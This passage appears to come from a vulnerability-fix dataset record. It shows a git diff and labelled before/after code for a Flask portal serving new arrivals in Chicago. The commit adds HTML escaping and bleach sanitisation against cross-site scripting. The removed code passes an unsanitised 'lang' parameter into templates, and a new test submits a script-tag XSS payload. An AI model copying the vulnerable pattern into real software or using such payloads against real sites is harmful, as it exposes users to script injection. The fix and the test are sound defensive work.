if language == 'es' else 'Please click below to begin:'}}</p>\n+    <h1>{{ 'Bienvenido' if language == 'es' else 'Welcome' | escape }}</h1>\n+    <p>{{ 'Encuentra apoyo para tus necesidades legales, de salud o de comida.' if language == 'es' else 'Find essential support for legal, health, and food needs.' | escape }}</p>\n+    <p>{{ 'Por favor haz click abajo para comenzar:' if language == 'es' else 'Please click below to begin:'| escape }}</p>\n     <div class=\"home-button-container\">\n-        <button class=\"button button-blue\" onclick=\"navigateTo('/legal', '{{ language }}')\">{{ 'Legal' if language == 'es' else 'Legal' }}</button>\n-        <button class=\"button button-yellow\" onclick=\"navigateTo('/health', '{{ language }}')\">{{ 'Salud' if language == 'es' else 'Health' }}</button>\n-        <button class=\"button button-green\" onclick=\"window.location.href='/food'\">{{ 'Comida' if language == 'es' else 'Food' }}</button>\n+        <button class=\"button button-blue\" onclick=\"navigateTo('/legal', '{{ language | escape }}')\">{{ 'Legal' if language == 'es' else 'Legal' | escape }}</button>\n+        <button class=\"button button-yellow\" onclick=\"navigateTo('/health', '{{ language | escape }}')\">{{ 'Salud' if language == 'es' else 'Health' | escape }}</button>\n+        <button class=\"button button-green\" onclick=\"window.location.href='/food'\">{{ 'Comida' if language == 'es' else 'Food' | escape }}</button>\n     </div>\n {% endblock %}\ndiff --git a/new_arrivals_chi/app/templates/info.html b/new_arrivals_chi/app/templates/info.html\nindex 0159dc1e..b04f3c16 100644\n--- a/new_arrivals_chi/app/templates/info.html\n+++ b/new_arrivals_chi/app/templates/info.html\n@@ -20,15 +20,15 @@\n {% block content %}\n \n <form action=\"/info\" method=\"GET\">\n-    <button type=\"submit\" class=\"language-button\">{{ 'Espa\u00f1ol' if language == 'es' else 'English' }}</button>\n-    <input type=\"hidden\" name=\"lang\" value=\"{{ 'es' if language == 'en' else 'en' }}\">\n+    <button type=\"submit\" class=\"language-button\">{{ 'Espa\u00f1ol' if language == 'es' else 'English' | escape }}</button>\n+    <input type=\"hidden\" name=\"lang\" value=\"{{ 'es' if language == 'en' else 'en' | escape }}\">\n </form>\n <div class=\"box\">\n-    <div class=\"box-big-title\">{{ 'Nombre de la Organizaci\u00f3n' if language == 'es' else 'Organization Name' }} </div>\n+    <div class=\"box-big-title\">{{ 'Nombre de la Organizaci\u00f3n' if language == 'es' else 'Organization Name' | escape }} </div>\n     <div class=\"box-contact-info\"> <i class=\"fa-solid fa-diamond-turn-right\"></i> 123 Main St&nbsp;&nbsp;<i class=\"fa-solid fa-phone\"></i> 234-567-8901</div>\n-    <div class=\"box-contact-info\">{{ 'Horas de Atenci\u00f3n: Lunes - Viernes, 9:00 AM - 5:00 PM' if language =='es' else 'Open Hours: Monday - Friday, 9:00 AM - 5:00 PM' }}</div>\n-    <div class=\"box-contact-info\">{{ 'Idiomas hablados: Ingl\u00e9s, Espa\u00f1ol' if language == 'es' else 'Languages Spoken: English, Spanish' }}</div>\n-    <div class=\"box-contact-info\">{{ 'Recursos y Servicios: Comida' if language == 'es' else 'Supplies and Services: Food'}}</div>\n+    <div class=\"box-contact-info\">{{ 'Horas de Atenci\u00f3n: Lunes - Viernes, 9:00 AM - 5:00 PM' if language =='es' else 'Open Hours: Monday - Friday, 9:00 AM - 5:00 PM' | escape }}</div>\n+    <div class=\"box-contact-info\">{{ 'Idiomas hablados: Ingl\u00e9s, Espa\u00f1ol' if language == 'es' else 'Languages Spoken: English, Spanish' | escape }}</div>\n+    <div class=\"box-contact-info\">{{ 'Recursos y Servicios: Comida' if language == 'es' else 'Supplies and Services: Food'| escape }}</div>\n </div>\n \n {% endblock %}\ndiff --git a/new_arrivals_chi/app/templates/legal.html b/new_arrivals_chi/app/templates/legal.html\nindex 868dc42f..ce7aab3b 100644\n--- a/new_arrivals_chi/app/templates/legal.html\n+++ b/new_arrivals_chi/app/templates/legal.html\n@@ -18,8 +18,8 @@\n {% block content %}\n \n     <form action=\"/legal\" method=\"GET\">\n-        <button type=\"submit\" class=\"language-button\">{{ 'Espa\u00f1ol' if language == 'en' else 'English' }}</button>\n-        <input type=\"hidden\" name=\"lang\" value=\"{{ 'es' if language == 'en' else 'en' }}\">\n+        <button type=\"submit\" class=\"language-button\">{{ 'Espa\u00f1ol' if language == 'en' else 'English' | escape }}</button>\n+        <input type=\"hidden\" name=\"lang\" value=\"{{ 'es' if language == 'en' else 'en' | escape }}\">\n     </form>\n     <div class=\"box\">\n         <div class=\"box-big-title\">Legal Resources and Services</div>\n@@ -30,7 +30,7 @@\n             <button class=\"button blue\">Receive legal assistance</button>\n             <button class=\"yellow-button\">Something else</button>\n             <p class=\"bottom-left\">\n-                <a href=\"/\">{{ '<    ' if language == 'es' else '< Back' }}</a>\n+                <a href=\"/\">{{ '<    ' if language == 'es' else '< Back' | escape }}</a>\n             </p>\n             <p>\n         </div>\ndiff --git a/new_arrivals_chi/app/templates/login.html b/new_arrivals_chi/app/templates/login.html\nindex 62dffdc6..f74ce408 100644\n--- a/new_arrivals_chi/app/templates/login.html\n+++ b/new_arrivals_chi/app/templates/login.html\n@@ -16,34 +16,34 @@\n {% extends \"base.html\" %}\n {% block content %}\n <div >\n-    <h3 class=\"title\">{{ 'Login' if language == 'en' else 'Iniciar sesi\u00f3n' }}</h3>\n+    <h3 class=\"title\">{{ 'Login' if language == 'en' else 'Iniciar sesi\u00f3n' | escape }}</h3>\n     <div class=\"box\">\n         {% with messages = get_flashed_messages() %}\n         {% if messages %}\n             <div class=\"notification is-danger\">\n-                {{ messages[0] }}\n+                {{ messages[0] | escape }}\n             </div>\n         {% endif %}\n         {% endwith %}\n         <form method=\"POST\" action=\"/login\">\n             <div class=\"field\">\n                 <div class=\"control\">\n-                    <input class=\"input is-large\" type=\"email\" name=\"email\" placeholder=\"{{ 'Email' if language == 'en' else 'Correo electr\u00f3nico' }}\" autofocus=\"\">\n+                    <input class=\"input is-large\" type=\"email\" name=\"email\" placeholder=\"{{ 'Email' if language == 'en' else 'Correo electr\u00f3nico' | escape }}\" autofocus=\"\">\n                 </div>\n             </div>\n \n             <div class=\"field\">\n                 <div class=\"control\">\n-                    <input class=\"input is-large\" type=\"password\" name=\"password\" placeholder=\"{{ 'Password' if language == 'en' else 'Contrase\u00f1a' }}\" oncopy=\"return false\" oncut=\"return false\" onpaste=\"return false\">\n+                    <input class=\"input is-large\" type=\"password\" name=\"password\" placeholder=\"{{ 'Password' if language == 'en' else 'Contrase\u00f1a' | escape }}\" oncopy=\"return false\" oncut=\"return false\" onpaste=\"return false\">\n                 </div>\n             </div>\n             <div class=\"field\">\n                 <label class=\"checkbox\">\n                     <input type=\"checkbox\" name=\"remember\">\n-                    {{ 'Remember me' if language == 'en' else 'Recordarme' }}\n+                    {{ 'Remember me' if language == 'en' else 'Recordarme' | escape }}\n                 </label>\n             </div>\n-            <button >{{ 'Login' if language == 'en' else 'Iniciar sesi\u00f3n' }}</button>\n+            <button >{{ 'Login' if language == 'en' else 'Iniciar sesi\u00f3n' | escape }}</button>\n         </form>\n     </div>\n </div>\ndiff --git a/new_arrivals_chi/app/templates/profile.html b/new_arrivals_chi/app/templates/profile.html\nindex 82e7c3df..f48054aa 100644\n--- a/new_arrivals_chi/app/templates/profile.html\n+++ b/new_arrivals_chi/app/templates/profile.html\n@@ -17,10 +17,10 @@\n <h1>\n     {{'Profile infomation will exist here.'\n     if language == 'en' else\n-    'La informaci\u00f3n del perfil existir\u00e1 aqu\u00ed.'}}\n+    'La informaci\u00f3n del perfil existir\u00e1 aqu\u00ed.'| escape }}\n \n     <div class=\"home-button-container\">\n-        <button class=\"button button-blue\" onclick=\"navigateTo('/change_password', '{{ language }}')\">{{ 'Cambiar su contrase\u00f1a' if language == 'es' else 'Change Password' }}</button>\n+        <button class=\"button button-blue\" onclick=\"navigateTo('/change_password', '{{ language | escape }}')\">{{ 'Cambiar su contrase\u00f1a' if language == 'es' else 'Change Password' | escape }}</button>\n     </div>\n </h1>\n {% endblock %}\ndiff --git a/new_arrivals_chi/app/templates/signup.html b/new_arrivals_chi/app/templates/signup.html\nindex 59eed2c1..a27906a6 100644\n--- a/new_arrivals_chi/app/templates/signup.html\n+++ b/new_arrivals_chi/app/templates/signup.html\n@@ -22,7 +22,7 @@\n             {% with messages = get_flashed_messages() %}\n             {% if messages %}\n                 <div class=\"notification is-danger\">\n-                    {{ messages[0] }}.</a>.\n+                    {{ messages[0] | escape }}.</a>.\n                 </div>\n             {% endif %}\n             {% endwith %}\n@@ -30,19 +30,19 @@\n \n             <div class=\"field\">\n                 <div class=\"control\">\n-                    <input class=\"input is-large\" type=\"email\" name=\"email\" placeholder=\"{{ 'Email' if language == 'en' else 'Correo electr\u00f3nico' }}\" autofocus=\"\">\n+                    <input class=\"input is-large\" type=\"email\" name=\"email\" placeholder=\"{{ 'Email' if language == 'en' else 'Correo electr\u00f3nico' | escape }}\" autofocus=\"\">\n                 </div>\n             </div>\n \n             <div class=\"field\">\n                 <div class=\"control\">\n-                    <input class=\"input is-large\" type=\"password\" name=\"password\" placeholder=\"{{ 'Password' if language == 'en' else 'Contrase\u00f1a' }}\" autofocus=\"\" oncopy=\"return false\" oncut=\"return false\" onpaste=\"return false\">\n+                    <input class=\"input is-large\" type=\"password\" name=\"password\" placeholder=\"{{ 'Password' if language == 'en' else 'Contrase\u00f1a' | escape }}\" autofocus=\"\" oncopy=\"return false\" oncut=\"return false\" onpaste=\"return false\">\n                 </div>\n             </div>\n \n             <div class=\"field\">\n                 <div class=\"control\">\n-                    <input class=\"input is-large\" type=\"password\" name=\"password_confirm\" placeholder=\"{{ 'Password' if language == 'en' else 'Contrase\u00f1a' }}\" autofocus=\"\" oncopy=\"return false\" oncut=\"return false\" onpaste=\"return false\">\n+                    <input class=\"input is-large\" type=\"password\" name=\"password_confirm\" placeholder=\"{{ 'Password' if language == 'en' else 'Contrase\u00f1a' | escape }}\" autofocus=\"\" oncopy=\"return false\" oncut=\"return false\" onpaste=\"return false\">\n                 </div>\n             </div>\n \n@@ -50,9 +50,9 @@\n                 {{ 'Your password must include at least one uppercase letter, one lowercase letter, one number, one special symbol, and be longer than 8 characters.'\n                     if language == 'en' else\n                     'Su contrase\u00f1a debe incluir al menos una letra may\u00fascula, una letra min\u00fascula, un n\u00famero, un s\u00edmbolo especial y tener m\u00e1s de 8 caracteres.'\n-                }}\n+                | escape }}\n             </div>\n-                <button class=\"button is-block is-info is-large is-fullwidth\">{{ 'Sign Up' if language == 'en' else 'Registrar' }}</button>\n+                <button class=\"button is-block is-info is-large is-fullwidth\">{{ 'Sign Up' if language == 'en' else 'Registrar' | escape }}</button>\n         </form>\n     </div>\n </div>\ndiff --git a/poetry.lock b/poetry.lock\nindex 763fa9e4..3254e5aa 100644\n--- a/poetry.lock\n+++ b/poetry.lock\n@@ -1,4 +1,4 @@\n-# This file is automatically @generated by Poetry 1.8.2 and should not be changed by hand.\n+# This file is automatically @generated by Poetry 1.4.2 and should not be changed by hand.\n \n [[package]]\n name = \"alembic\"\n@@ -101,6 +101,25 @@ charset-normalizer = [\"charset-normalizer\"]\n html5lib = [\"html5lib\"]\n lxml = [\"lxml\"]\n \n+[[package]]\n+name = \"bleach\"\n+version = \"6.1.0\"\n+description = \"An easy safelist-based HTML-sanitizing tool.\"\n+category = \"main\"\n+optional = false\n+python-versions = \">=3.8\"\n+files = [\n+    {file = \"bleach-6.1.0-py3-none-any.whl\", hash = \"sha256:3225f354cfc436b9789c66c4ee030194bee0568fbf9cbdad3bc8b5c26c5f12b6\"},\n+    {file = \"bleach-6.1.0.tar.gz\", hash = \"sha256:0a31f1837963c41d46bbf1331b8778e1308ea0791db03cc4e7357b97cf42a8fe\"},\n+]\n+\n+[package.dependencies]\n+six = \">=1.9.0\"\n+webencodings = \"*\"\n+\n+[package.extras]\n+css = [\"tinycss2 (>=1.1.0,<1.3)\"]\n+\n [[package]]\n name = \"blinker\"\n version = \"1.8.2\"\n@@ -1413,6 +1432,18 @@ files = [\n     {file = \"wcwidth-0.2.13.tar.gz\", hash = \"sha256:72ea0c06399eb286d978fdedb6923a9eb47e1c486ce63e9b4e64fc18303972b5\"},\n ]\n \n+[[package]]\n+name = \"webencodings\"\n+version = \"0.5.1\"\n+description = \"Character encoding aliases for legacy web content\"\n+category = \"main\"\n+optional = false\n+python-versions = \"*\"\n+files = [\n+    {file = \"webencodings-0.5.1-py2.py3-none-any.whl\", hash = \"sha256:a0af1213f3c2226497a97e2b3aa01a7e4bee4f403f95be16fc9acd2947514a78\"},\n+    {file = \"webencodings-0.5.1.tar.gz\", hash = \"sha256:b36a1c245f2d304965eb4e0a82848379241dc04b865afcc4aab16748587e1923\"},\n+]\n+\n [[package]]\n name = \"werkzeug\"\n version = \"3.0.3\"\ndiff --git a/pyproject.toml b/pyproject.toml\nindex 9feee7ff..bec87575 100644\n--- a/pyproject.toml\n+++ b/pyproject.toml\n@@ -23,6 +23,7 @@ pyopenssl = \"^24.1.0\"\n password-strength = \"^0.0.3.post2\"\n flask-bcrypt = \"^1.0.1\"\n flask-testing = \"^0.8.1\"\n+bleach = \"^6.1.0\"\n \n [tool.ruff.pydocstyle]\n convention = \"google\"\ndiff --git a/tests/auth_change_password_test.py b/tests/auth_change_password_test.py\nindex eb856b23..f4517904 100644\n--- a/tests/auth_change_password_test.py\n+++ b/tests/auth_change_password_test.py\n@@ -79,6 +79,7 @@ def test_change_password_wrong_old_password(\n             data={\n                 \"old_password\": \"BestP@ssword!\",\n                 \"new_password\": \"TestP@ssword!_2!\",\n+                \"new_password_confirm\": \"TestP@ssword!_2!\",\n             },\n             follow_redirects=True,\n         )\n@@ -118,6 +119,7 @@ def test_change_password_wrong_new_password_same_as_old(\n             data={\n                 \"old_password\": \"TestP@ssword!\",\n                 \"new_password\": \"TestP@ssword!\",\n+                \"new_password_confirm\": \"TestP@ssword!\",\n             },\n             follow_redirects=True,\n         )\ndiff --git a/tests/xss_test.py b/tests/xss_test.py\nnew file mode 100644\nindex 00000000..04232f36\n--- /dev/null\n+++ b/tests/xss_test.py\n@@ -0,0 +1,38 @@\n+\"\"\"Project: New Arrivals Chi.\n+\n+File name: xxs_test.py\n+\n+This test suite pressure tests the app for XSS attacks.\n+\n+Methods:\n+    * test_xss_script_tag_injection\n+\n+Last updated:\n+@Author: Kathryn Link-Oberstar @klinkoberstar\n+@Date: 05/09/2024\n+\n+Creation:\n+@Author: Kathryn Link-Oberstar @klinkoberstar\n+@Date: 05/09/2024\n+\"\"\"\n+\n+\n+def test_xss_script_tag_injection(client):\n+    \"\"\"\"\"\n+    Test the resistance of the change password form to XSS attacks.\n+\n+    Attempt to inject a script tag into the new password fields. This test\n+    ensures that script tags submitted through the change password form are\n+    properly escaped or removed.\n+    \"\"\" \"\"\n+    response = client.post(\n+        \"/change_password\",\n+        data={\n+            \"old_password\": \"validPassword1!\",\n+            \"new_password\": \"<script>alert('XSS');</script>\",\n+            \"new_password_confirm\": \"<script>alert('XSS');</script>\",\n+        },\n+        follow_redirects=True,\n+    )\n+    assert \"<script>alert('XSS');</script>\" not in response.data.decode()\n+    assert response.status_code == 200\n",
            "message": "",
            "files": {
                "/new_arrivals_chi/app/authorize_routes.py": {
                    "changes": [
                        {
                            "diff": "\n     * post_change_password - Executes change password logic.\n \n Last updated:\n-@Author: Madeleine Roberts @MadeleineKRoberts\n+@Author: Kathryn Link-Oberstar @klinkoberstar\n @Date: 05/09/2024\n \n Creation:\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/new_arrivals_chi/app/authorize_routes.py",
                            "badparts": [
                                "@Author: Madeleine Roberts @MadeleineKRoberts"
                            ],
                            "goodparts": [
                                "@Author: Kathryn Link-Oberstar @klinkoberstar"
                            ]
                        },
                        {
                            "diff": "\n     Returns:\n         Renders sign up page in their selected language.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"signup.html\", language=language)\n \n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/new_arrivals_chi/app/authorize_routes.py",
                            "badparts": [
                                "    language = request.args.get(\"lang\", \"en\")"
                            ],
                            "goodparts": [
                                "    language = bleach.clean(request.args.get(\"lang\", \"en\"))"
                            ]
                        },
                        {
                            "diff": "\n \n     # ensure that input meets requirments\n     if not validate_email_syntax(email):\n-        flash(\"Please enter a valid email address\")\n+        flash(escape(\"Please enter a valid email address\"))\n \n     elif User.query.filter_by(email=email).first():\n         # email already exists in database\n-        flash(\"Email address already exists for user\")\n+        flash(escape(\"Email address already exists for user\"))\n \n     elif not password == password_confirm:\n-        flash(\"Passwords do not match. Try again\")\n+        flash(escape(\"Passwords do not match. Try again\"))\n \n     elif not validate_password(password):\n-        flash(\"Please enter a valid password\")\n+        flash(escape(\"Please enter a valid password\"))\n \n     else:\n         # Meets all sign up requirements\n",
                            "add": 4,
                            "remove": 4,
                            "filename": "/new_arrivals_chi/app/authorize_routes.py",
                            "badparts": [
                                "        flash(\"Please enter a valid email address\")",
                                "        flash(\"Email address already exists for user\")",
                                "        flash(\"Passwords do not match. Try again\")",
                                "        flash(\"Please enter a valid password\")"
                            ],
                            "goodparts": [
                                "        flash(escape(\"Please enter a valid email address\"))",
                                "        flash(escape(\"Email address already exists for user\"))",
                                "        flash(escape(\"Passwords do not match. Try again\"))",
                                "        flash(escape(\"Please enter a valid password\"))"
                            ]
                        },
                        {
                            "diff": "\n     Returns:\n         Renders login page for user with their selected language.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"login.html\", language=language)\n \n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/new_arrivals_chi/app/authorize_routes.py",
                            "badparts": [
                                "    language = request.args.get(\"lang\", \"en\")"
                            ],
                            "goodparts": [
                                "    language = bleach.clean(request.args.get(\"lang\", \"en\"))"
                            ]
                        },
                        {
                            "diff": "\n \n     # check if the user actually exists & password is correct\n     if not user or not verify_password(user.password, password):\n-        flash(\"Please check your login details and try again.\")\n+        flash(escape(\"Please check your login details and try again.\"))\n         return redirect(\n             url_for(\"authorize.login\")\n         )  # if the user doesn't exist or password is wrong, reload the page\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/new_arrivals_chi/app/authorize_routes.py",
                            "badparts": [
                                "        flash(\"Please check your login details and try again.\")"
                            ],
                            "goodparts": [
                                "        flash(escape(\"Please check your login details and try again.\"))"
                            ]
                        },
                        {
                            "diff": "\n     Returns:\n         Renders change password page for user with their selected language.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"change_password.html\", language=language)\n \n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/new_arrivals_chi/app/authorize_routes.py",
                            "badparts": [
                                "    language = request.args.get(\"lang\", \"en\")"
                            ],
                            "goodparts": [
                                "    language = bleach.clean(request.args.get(\"lang\", \"en\"))"
                            ]
                        },
                        {
                            "diff": "\n     )\n \n     if not verify_password(current_user.password, old_password):\n-        flash(\"Wrong existing password. Try again\")\n+        flash(escape(\"Wrong existing password. Try again\"))\n \n     elif old_password == new_password:\n         # Do not need to check password hash because old password is correct\n-        flash(\"New password cannot be the same as your previous password.\")\n+        flash(\n+            escape(\"New password cannot be the same as your previous password.\")\n+        )\n \n     elif not new_password == new_password_confirm:\n-        flash(\"New passwords do not match. Try again\")\n+        flash(escape(\"New passwords do not match. Try again\"))\n \n     elif not validate_password(new_password):\n-        flash(\"New password does not meet requirements. Try again.\")\n+        flash(escape(\"New password does not meet requirements. Try again.\"))\n \n     else:\n         change_db_password(new_password)\n-        flash(\"Password change successful.\")\n+        flash(escape(\"Password change successful.\"))\n         return redirect(url_for(\"main.profile\"))\n \n     return redirect(url_for(\"authorize.change_password\"))",
                            "add": 7,
                            "remove": 5,
                            "filename": "/new_arrivals_chi/app/authorize_routes.py",
                            "badparts": [
                                "        flash(\"Wrong existing password. Try again\")",
                                "        flash(\"New password cannot be the same as your previous password.\")",
                                "        flash(\"New passwords do not match. Try again\")",
                                "        flash(\"New password does not meet requirements. Try again.\")",
                                "        flash(\"Password change successful.\")"
                            ],
                            "goodparts": [
                                "        flash(escape(\"Wrong existing password. Try again\"))",
                                "        flash(",
                                "            escape(\"New password cannot be the same as your previous password.\")",
                                "        )",
                                "        flash(escape(\"New passwords do not match. Try again\"))",
                                "        flash(escape(\"New password does not meet requirements. Try again.\"))",
                                "        flash(escape(\"Password change successful.\"))"
                            ]
                        }
                    ],
                    "source": "\n\"\"\"Project: new_arrivals_chi. File name: authorize_routes.py Associated Files: Templates: profile.html, signup.html, login.html. Defines routes for user creation and authentication for new arrivals portal. Methods: * signup -Route to the user sign up page. * signup_post -Executes user sign up logic. * login -Route to the login page. * login_post -Executes user login logic. * signout -Routes and executes user sign out logic. * change_password -Route to the change password page. * post_change_password -Executes change password logic. Last updated: @Author: Madeleine Roberts @MadeleineKRoberts @Date: 05/09/2024 Creation: @Author: Madeleine Roberts @MadeleineKRoberts @Date: 05/01/2024 \"\"\" from flask import Blueprint, render_template, redirect, url_for, request, flash from new_arrivals_chi.app.database import User from new_arrivals_chi.app.utils import( validate_email_syntax, validate_password, extract_signup_data, extract_new_pw_data, verify_password, ) from flask_login import login_user, login_required, logout_user, current_user from new_arrivals_chi.app.data_handler import create_user, change_db_password authorize=Blueprint(\"authorize\", __name__, static_folder=\"/static\") @authorize.route(\"/signup\") def signup(): \"\"\"Establishes route for the user sign up page. This route is accessible within the 'sign up' button in the navigation bar. Returns: Renders sign up page in their selected language. \"\"\" language=request.args.get(\"lang\", \"en\") return render_template(\"signup.html\", language=language) @authorize.route(\"/signup\", methods=[\"POST\"]) def signup_post(): \"\"\"Handles the POST request for user sign up. Validates the input data, adds the user to the database if valid, and redirects accordingly. Returns: Redirects to the home page upon successful sign up. Redirects back to the sign up page if there are validation errors or if the email address already exists in the database. \"\"\" email, password, password_confirm=extract_signup_data(request.form) if not validate_email_syntax(email): flash(\"Please enter a valid email address\") elif User.query.filter_by(email=email).first(): flash(\"Email address already exists for user\") elif not password==password_confirm: flash(\"Passwords do not match. Try again\") elif not validate_password(password): flash(\"Please enter a valid password\") else: new_user=create_user(email, password) login_user(new_user, remember=False) return redirect(url_for(\"main.profile\")) return redirect(url_for(\"authorize.signup\")) @authorize.route(\"/login\") def login(): \"\"\"Establishes route for the login page. Login route is accessible within the 'login' button in the navigation bar. Returns: Renders login page for user with their selected language. \"\"\" language=request.args.get(\"lang\", \"en\") return render_template(\"login.html\", language=language) @authorize.route(\"/login\", methods=[\"POST\"]) def login_post(): \"\"\"Processes the login request. Returns: Redirects to the user's profile page if login is successful, otherwise redirects back to the login page with a flash message. \"\"\" email=request.form.get(\"email\").lower() password=request.form.get(\"password\") remember=True if request.form.get(\"remember\") else False user=User.query.filter_by(email=email).first() if not user or not verify_password(user.password, password): flash(\"Please check your login details and try again.\") return redirect( url_for(\"authorize.login\") ) login_user(user, remember=remember) return redirect(url_for(\"main.profile\")) @authorize.route(\"/logout\") @login_required def logout(): \"\"\"Logs out the current user. Returns: Redirects to the home page after logout. If a user is not currently logged in, redirects to the log in page. \"\"\" logout_user() return redirect(url_for(\"main.home\")) @authorize.route(\"/change_password\") @login_required def change_password(): \"\"\"Establishes route for the change password page. This route is accessible within the 'change password' button in the profile page(will likely change location in the future). Returns: Renders change password page for user with their selected language. \"\"\" language=request.args.get(\"lang\", \"en\") return render_template(\"change_password.html\", language=language) @authorize.route(\"/change_password\", methods=[\"POST\"]) @login_required def post_change_password(): \"\"\"Allows an authorized user to update their current password. Returns: Redirects to the user's profile page if password change is successful, otherwise redirects back to the change password page with a flash message. \"\"\" old_password, new_password, new_password_confirm=extract_new_pw_data( request.form ) if not verify_password(current_user.password, old_password): flash(\"Wrong existing password. Try again\") elif old_password==new_password: flash(\"New password cannot be the same as your previous password.\") elif not new_password==new_password_confirm: flash(\"New passwords do not match. Try again\") elif not validate_password(new_password): flash(\"New password does not meet requirements. Try again.\") else: change_db_password(new_password) flash(\"Password change successful.\") return redirect(url_for(\"main.profile\")) return redirect(url_for(\"authorize.change_password\")) ",
                    "sourceWithComments": "\"\"\"Project: new_arrivals_chi.\n\nFile name: authorize_routes.py\nAssociated Files:\n    Templates: profile.html, signup.html, login.html.\n\nDefines routes for user creation and authentication for new arrivals portal.\n\nMethods:\n    * signup - Route to the user sign up page.\n    * signup_post - Executes user sign up logic.\n    * login - Route to the login page.\n    * login_post - Executes user login logic.\n    * signout - Routes and executes user sign out logic.\n    * change_password - Route to the change password page.\n    * post_change_password - Executes change password logic.\n\nLast updated:\n@Author: Madeleine Roberts @MadeleineKRoberts\n@Date: 05/09/2024\n\nCreation:\n@Author: Madeleine Roberts @MadeleineKRoberts\n@Date: 05/01/2024\n\"\"\"\n\nfrom flask import Blueprint, render_template, redirect, url_for, request, flash\nfrom new_arrivals_chi.app.database import User\nfrom new_arrivals_chi.app.utils import (\n    validate_email_syntax,\n    validate_password,\n    extract_signup_data,\n    extract_new_pw_data,\n    verify_password,\n)\nfrom flask_login import login_user, login_required, logout_user, current_user\nfrom new_arrivals_chi.app.data_handler import create_user, change_db_password\n\n\nauthorize = Blueprint(\"authorize\", __name__, static_folder=\"/static\")\n\n\n@authorize.route(\"/signup\")\ndef signup():\n    \"\"\"Establishes route for the user sign up page.\n\n    This route is accessible within the 'sign up' button in the navigation bar.\n\n\n    Returns:\n        Renders sign up page in their selected language.\n    \"\"\"\n    language = request.args.get(\"lang\", \"en\")\n    return render_template(\"signup.html\", language=language)\n\n\n@authorize.route(\"/signup\", methods=[\"POST\"])\ndef signup_post():\n    \"\"\"Handles the POST request for user sign up.\n\n    Validates the input data, adds the user to the database if valid, and\n    redirects accordingly.\n\n    Returns:\n        Redirects to the home page upon successful sign up.\n        Redirects back to the sign up page if there are validation errors\n        or if the email address already exists in the database.\n    \"\"\"\n    email, password, password_confirm = extract_signup_data(request.form)\n\n    # ensure that input meets requirments\n    if not validate_email_syntax(email):\n        flash(\"Please enter a valid email address\")\n\n    elif User.query.filter_by(email=email).first():\n        # email already exists in database\n        flash(\"Email address already exists for user\")\n\n    elif not password == password_confirm:\n        flash(\"Passwords do not match. Try again\")\n\n    elif not validate_password(password):\n        flash(\"Please enter a valid password\")\n\n    else:\n        # Meets all sign up requirements\n        new_user = create_user(email, password)\n        login_user(new_user, remember=False)\n        return redirect(url_for(\"main.profile\"))\n\n    return redirect(url_for(\"authorize.signup\"))\n\n\n@authorize.route(\"/login\")\ndef login():\n    \"\"\"Establishes route for the login page.\n\n    Login route is accessible within the 'login' button in the navigation bar.\n\n    Returns:\n        Renders login page for user with their selected language.\n    \"\"\"\n    language = request.args.get(\"lang\", \"en\")\n    return render_template(\"login.html\", language=language)\n\n\n@authorize.route(\"/login\", methods=[\"POST\"])\ndef login_post():\n    \"\"\"Processes the login request.\n\n    Returns:\n        Redirects to the user's profile page if login is successful,\n        otherwise redirects back to the login page with a flash message.\n    \"\"\"\n    email = request.form.get(\"email\").lower()\n    password = request.form.get(\"password\")\n    remember = True if request.form.get(\"remember\") else False\n\n    user = User.query.filter_by(email=email).first()\n\n    # check if the user actually exists & password is correct\n    if not user or not verify_password(user.password, password):\n        flash(\"Please check your login details and try again.\")\n        return redirect(\n            url_for(\"authorize.login\")\n        )  # if the user doesn't exist or password is wrong, reload the page\n\n    # if the above check passes, then we know the user has the right credentials\n    login_user(user, remember=remember)\n    return redirect(url_for(\"main.profile\"))\n\n\n@authorize.route(\"/logout\")\n@login_required\ndef logout():\n    \"\"\"Logs out the current user.\n\n    Returns:\n        Redirects to the home page after logout.\n        If a user is not currently logged in, redirects to the log in page.\n    \"\"\"\n    logout_user()\n    return redirect(url_for(\"main.home\"))\n\n\n@authorize.route(\"/change_password\")\n@login_required\ndef change_password():\n    \"\"\"Establishes route for the change password page.\n\n    This route is accessible within the 'change password' button in the profile\n    page (will likely change location in the future).\n\n    Returns:\n        Renders change password page for user with their selected language.\n    \"\"\"\n    language = request.args.get(\"lang\", \"en\")\n    return render_template(\"change_password.html\", language=language)\n\n\n@authorize.route(\"/change_password\", methods=[\"POST\"])\n@login_required\ndef post_change_password():\n    \"\"\"Allows an authorized user to update their current password.\n\n    Returns:\n        Redirects to the user's profile page if password change is successful,\n        otherwise redirects back to the change password page with a flash\n        message.\n    \"\"\"\n    old_password, new_password, new_password_confirm = extract_new_pw_data(\n        request.form\n    )\n\n    if not verify_password(current_user.password, old_password):\n        flash(\"Wrong existing password. Try again\")\n\n    elif old_password == new_password:\n        # Do not need to check password hash because old password is correct\n        flash(\"New password cannot be the same as your previous password.\")\n\n    elif not new_password == new_password_confirm:\n        flash(\"New passwords do not match. Try again\")\n\n    elif not validate_password(new_password):\n        flash(\"New password does not meet requirements. Try again.\")\n\n    else:\n        change_db_password(new_password)\n        flash(\"Password change successful.\")\n        return redirect(url_for(\"main.profile\"))\n\n    return redirect(url_for(\"authorize.change_password\"))\n"
                },
                "/new_arrivals_chi/app/main.py": {
                    "changes": [
                        {
                            "diff": "\n     Returns:\n         Renders home page.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"home.html\", language=language)\n \n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/new_arrivals_chi/app/main.py",
                            "badparts": [
                                "    language = request.args.get(\"lang\", \"en\")"
                            ],
                            "goodparts": [
                                "    language = bleach.clean(request.args.get(\"lang\", \"en\"))"
                            ]
                        },
                        {
